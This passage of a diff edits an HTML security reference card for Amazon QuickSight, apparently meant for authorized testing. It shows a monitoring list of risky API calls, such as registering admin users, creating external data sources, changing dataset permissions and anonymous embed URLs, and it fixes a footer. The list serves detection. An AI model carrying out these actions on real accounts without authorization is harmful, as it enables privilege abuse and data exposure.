+- RegisterUser (especially with ADMIN role)
+- CreateDataSource (new external connections)
+- UpdateDataSetPermissions (privilege changes)
+- GenerateEmbedUrlForAnonymousUser (data exposure)</code></pre>
             </div>
           </div>
         </div></div></div>
 
-<!-- Footer -->
 <div class="footer">
-  <p>Amazon QuickSight Security Security Card</p>
-  <p style="margin-top:0.25rem;">Always obtain proper authorization before testing</p>
+  <p><strong>Amazon QuickSight Security Card</strong></p>
+  <p>Always obtain proper authorization before testing</p>
 </div>
 
 </body>
